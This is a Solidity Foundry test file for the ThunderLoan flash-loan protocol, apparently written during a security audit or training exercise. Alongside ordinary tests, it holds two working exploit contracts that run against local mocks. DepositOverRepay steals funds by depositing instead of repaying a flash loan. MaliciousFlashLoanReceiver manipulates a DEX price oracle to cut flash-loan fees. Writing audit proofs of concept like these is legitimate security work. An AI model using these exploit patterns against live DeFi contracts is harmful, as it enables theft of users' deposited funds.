// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import{BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
import{BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function testRedeemAfterLoan() public setAllowedToken hasDeposits{
        //liquidityProvider deposits the asset
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        //user taking the flashloan
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        //liquidityProvider redeeming his assets as we
        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }

    function testUserDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits{
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor =  new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        console.log("balance of dor contract",tokenA.balanceOf(address(dor))); //50157185829891086986
        console.log("balance of tokenA contract", address(tokenA).balance); //0
        console.log("amount borrowed + fee", 50e18 + fee); //50150000000000000000
        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }

    function testOracleManipulation() public{
        //SettingUp contracts
        thunderLoan = new ThunderLoan();
        tokenA =  new ERC20Mock();

        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory  pf = new BuffMockPoolFactory(address(weth)); 

        //creating a TSwap DEx b/w  wETH and TokenA
        address tswapPool  = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        //2. Funding TSwap
        vm.startPrank(liquidityProvider);
        //funding tokenA
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);

        //funding wETH
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();
    
        /**
         *  before manipulation 
            RATIO 100 wETH and 100 TokenA
            Price: 1:1
         */

        //3.Funding ThunderLoan
        // we need to setup a tokenA on the protocol (ThunderLoan)
        vm.startPrank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        //3.1 providing liquidity to the thunderLoan
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        /**
         * 100 wETH and 100 TokenA in TSwap
         * 1000 TokenA in thunderLoan
         * Take out a flashloan of 50 tokenA, swap it on the dex, changing  the price > 150 TokenA & ~80 wETH
         * Take out another flashloan of 50 TokenA(and we'll see how much cheaper it is!!)
         */
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal fee cost :", normalFeeCost);

        //0.296147410319118389 (our goal is reduce the normal fee cost)

        uint256 amountToBorrow = 50e18; //we gonna do this twice
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();
        
        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("Attack fee is : ",attackFee);
        assert(attackFee < normalFeeCost);

        
    }

}

contract  DepositOverRepay is  IFlashLoanReceiver{
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;
    constructor(address _thunderLoan){
        thunderLoan = ThunderLoan(_thunderLoan);
    }
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /* params*/
    )
        external
        returns (bool)
        {
            s_token = IERC20(token);
            assetToken = thunderLoan.getAssetFromToken(IERC20(token));
            IERC20(token).approve(address(thunderLoan), amount +fee);
            thunderLoan.deposit(IERC20(token),amount+ fee);
            return true;
        }
    function redeemMoney() public{
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);

    }
}


contract  MaliciousFlashLoanReceiver is  IFlashLoanReceiver{
    /**
     * 1. Swap TokenA borrowed for wETH
     * 2. Take out another flash loan, to show the difference
     */
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256  public feeOne;
    uint256 public feeTwo;
    
    constructor(address _tswapPool, address _thunderLoan, address _repayAddress){
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /* params*/
    )
        external
        returns (bool)
        {
            if(!attacked){
                feeOne = fee;
                attacked = true;
                uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
                IERC20(token).approve(address(tswapPool), 50e18);
                tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);

                //calling a second flash loan
                thunderLoan.flashloan(address(this), IERC20(token), amount, "");
                //repaying 
                // IERC20(token).approve(address(thunderLoan), amount + fee);
                // thunderLoan.repay(IERC20(token), amount + fee);
                IERC20(token).transfer(address(repayAddress), amount + fee);
            }
            else{
                //calculate the fee and repay
                feeTwo = fee;
                //repay
                // IERC20(token).approve(address(thunderLoan), amount + fee);
                // thunderLoan.repay(IERC20(token), amount + fee);
                IERC20(token).transfer(address(repayAddress), amount + fee);

                
            }
            return true;
            
        }


}
